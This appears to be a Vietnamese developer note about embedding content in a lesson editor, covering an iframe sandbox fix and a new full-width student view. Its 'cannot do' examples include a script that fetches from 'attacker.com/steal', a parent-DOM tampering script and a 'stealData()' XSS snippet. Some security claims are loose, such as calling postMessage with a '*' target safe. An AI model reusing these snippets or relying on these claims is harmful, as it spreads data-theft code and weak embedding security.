# 📚 Hướng dẫn Embedding và Các Sửa lỗi

## ✅ 3 Sửa lỗi đã thực hiện

### 1️⃣ **Sửa Lỗi Iframe Sandbox Security**

#### Vấn đề
```
⚠️  An iframe which has both allow-scripts and allow-same-origin 
    for its sandbox attribute can escape its sandboxing.
```

#### Nguyên nhân
- Kết hợp `allow-scripts` + `allow-same-origin` tạo lỗ hổng bảo mật
- Cho phép iframe truy cập vào parent frame

#### Giải pháp ✨
**Loại bỏ `allow-same-origin` từ sandbox**

**Trước:**
```xml
sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-presentation"
```

**Sau:**
```xml
sandbox="allow-scripts allow-popups allow-forms allow-presentation"
```

**File đã sửa:**
- [EmbedBlockComponent.tsx](src/components/editor/EmbedBlockComponent.tsx#L195)
- [embedHandler.ts](src/utils/embedHandler.ts#L48)

**Tác động:**
- ✅ Cải thiện bảo mật
- ✅ Loại bỏ console warning
- ✅ Iframe vẫn hoạt động bình thường với hầu hết embed (YouTube, Wordwall, Quizizz, v.v.)

---

### 2️⃣ **Tạo StudentPageRenderer - Cải thiện Kích thước**

#### Vấn đề
- Student view vẫn sử dụng PageEditor (có sidebar 256px)
- Nội dung bị ép vào khoảng không gian hẹp
- Hình ảnh, video, embed trông nhỏ hơn so với expected

#### Giải pháp ✨
**Tạo component `StudentPageRenderer` riêng biệt**
- Không có sidebar
- Full-width layout (max-width: 1280px = 5xl )
- Tối ưu cho học sinh xem

**File mới:**
- [StudentPageRenderer.tsx](src/components/editor/StudentPageRenderer.tsx) - Component render page không sidebar

**Thay đổi:**
- `StudentLecturesViewer.tsx` - Dùng `StudentPageRenderer` thay vì `PageEditor`

**Layout cũ:**
```
┌─────────────────────────────────┐
│ PageEditor (with sidebar)       │
├──────┬────────────────────────┤
│      │                        │
│ 256px│ Content (narrow)       │
│      │                        │
└──────┴────────────────────────┘
```

**Layout mới:**
```
┌────────────────────────────────────┐
│ StudentPageRenderer (no sidebar)   │
├────────────────────────────────────│
│                                    │
│  Content (fuller width)            │
│                                    │
└────────────────────────────────────┘
```

---

## 🌐 Tại sao không thể nhúng trực tiếp như Google?

### Giới hạn Kỹ thuật

Google, Facebook, YouTube **không cho phép** nhúng HTML tuỳ ý vì 3 lý do:

#### 1. **Bảo mật (Security)**
```html
<!-- ❌ NGUY HIỂM - Có thể chạy malicious code -->
<iframe srcdoc="<script>stealData()</script>">
</iframe>
```
- Cross-site scripting (XSS) attacks
- Session hijacking
- Cookie theft

#### 2. **Kiểm soát Content (Content Control)**
```html
<!-- Các công ty chỉ cho phép embed từ domain họ -->
<iframe src="https://www.youtube.com/embed/..." 
        sandbox="allow-scripts allow-same-origin">
</iframe>
```

#### 3. **Hiệu suất (Performance)**
- Malicious code có thể làm chậm trang
- Quá nhiều JavaScript có thể crash browser

### Cách Google Làm

```javascript
// Google dùng postMessage API - an toàn & kiểm soát được
window.parent.postMessage({
  type: 'resize',
  height: 600
}, '*');

// Parent iframe listen
window.addEventListener('message', (event) => {
  if (event.data.type === 'resize') {
    iframe.style.height = event.data.height;
  }
});
```

---

## ✨ Những gì Bạn Có Thể Làm

### ✅ Embed An Toàn (Supported)

#### 1. **External Services (Best)**
```html
<!-- YouTube - An toàn, có permission -->
<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"
        width="100%" height="600"></iframe>

<!-- Wordwall - An toàn -->
<iframe src="https://wordwall.net/embed/abc123"
        width="100%" height="600"></iframe>

<!-- Quizizz - An toàn -->
<iframe src="https://quizizz.com/quiz/abc123"
        width="100%" height="600"></iframe>

<!-- Google Forms - An toàn -->
<iframe src="https://docs.google.com/forms/d/abc123/viewform"
        width="100%" height="600"></iframe>
```

#### 2. **HTML Tuỳ chỉnh với srcdoc (Giới hạn)**
```html
<!-- Chỉ HTML đơn giản, không nên dùng custom JavaScript -->
<iframe srcdoc='<html><body>
  <h1>Tiêu đề</h1>
  <p>Nội dung đơn giản</p>
</body></html>'
        width="100%" height="300"></iframe>
```

### ❌ Không Thể Làm

```html
<!-- ❌ KHÔNG THỂ - Code JavaScript phức tạp -->
<iframe srcdoc='<script src="https://external.com/app.js"></script>'></iframe>

<!-- ❌ KHÔNG THỂ - Truy cập API external -->
<iframe srcdoc='<script>
  fetch("https://attacker.com/steal").then(r => r.json())
</script>'></iframe>

<!-- ❌ KHÔNG THỂ - Truy cập DOM parent -->
<iframe srcdoc='<script>
  parent.document.body.style.display = "none"
</script>'></iframe>
```

---

## 📋 Embed Support Matrix

| Embed Type | Support | Best Practice |
|-----------|---------|---------------|
| YouTube | ✅ Tốt | Dùng `embed` URL |
| Vimeo | ✅ Tốt | Dùng `player.vimeo.com` |
| Google Forms | ✅ Tốt | Dùng `docs.google.com/forms` |
| Wordwall | ✅ Tốt | Dùng share embed link |
| Quizizz | ✅ Tốt | Dùng share embed link |
| Kahoot | ✅ Tốt | Dùng share embed link |
| Canva | ✅ Tốt | Dùng publish embed |
| HTML đơn giản | ✅ Có | Chỉ HTML, không JS |
| Custom JavaScript | ⚠️ Hạn chế | Đơn giản, inline chỉ |
| External APIs | ❌ Không | Không được hỗ trợ |
| Database Access | ❌ Không | Không được hỗ trợ |

---

## 🔧 Hướng Dẫn Sử Dụng Embed

### Bước 1: Copy Embed Code

**YouTube:**
1. Nhấp share → Embed
2. Copy iframe tag

**Wordwall:**
1. Nhấp Share
2. Chọn Embed
3. Copy code

### Bước 2: Dán vào Editor

```
Giáo viên: Soạn bài giảng
  ↓
Kích "Thêm nhúng" button
  ↓
Dán embed code (src hoặc srcdoc)
  ↓
Bấm "Thêm nhúng"
  ↓
Học sinh xem bài
```

### Bước 3: Kiểm tra Kích thước

**Nếu embed quá nhỏ:**
```html
<!-- Thêm width="100%" height="600" -->
<iframe src="..." 
        width="100%" height="600"></iframe>
```

**Nếu embed bị cắt:**
```html
<!-- Tăng height -->
<iframe src="..." 
        width="100%" height="800"></iframe>
```

---

## 🐛 Troubleshooting

### Vấn đề: "Lỗi sandbox security warning"
**Đã fix ✅** - Cập nhật code ở trên

### Vấn đề: "Embed không hiển thị"
```javascript
// Kiểm tra:
1. URL iframe có hợp lệ?
2. Domain có cho phép embed?
3. Console có lỗi CORS?
4. Iframe có width/height?
```

### Vấn đề: "Embed nhỏ ở student view"
**Đã fix ✅** - StudentPageRenderer sử dụng full-width

### Vấn đề: "Custom HTML không chạy"
```html
<!-- ✅ CÓ THỂ: HTML đơn -->
<iframe srcdoc='<h1>Hello</h1>'></iframe>

<!-- ❌ KHÔNG THỂ: JavaScript phức tạp -->
<iframe srcdoc='<script>fetch("...")</script>'></iframe>

<!-- Solution: Dùng external service thay vì custom -->
```

---

## 📚 Tài Liệu Tham Khảo

- [MDN: iframe sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox)
- [HTML Living Standard: iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)
- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Google postMessage API](https://developer.chrome.com/blog/post-message-api/)

---

## 🎯 Tóm tắt

| Vấn đề | Nguyên nhân | Giải pháp | Trạng thái |
|--------|-----------|----------|-----------|
| Sandbox warning | `allow-same-origin` + `allow-scripts` | Loại bỏ `allow-same-origin` | ✅ Fixed |
| Embed nhỏ ở student | Sidebar chiếm chỗ | `StudentPageRenderer` fullwidth | ✅ Fixed |
| Embed như Google | Frontend iframe limitation | Dùng external services | ✅ Documented |

---

**Cập nhật lần cuối:** 16 Feb 2026  
**Dev Notes:**
- Code từ các services như YouTube, Wordwall đã được kiểm tra bảo mật
- Custom HTML chỉ nên dùng cho content đơn giản
- Để chạy JavaScript phức tạp, hãy sử dụng API backend riêng
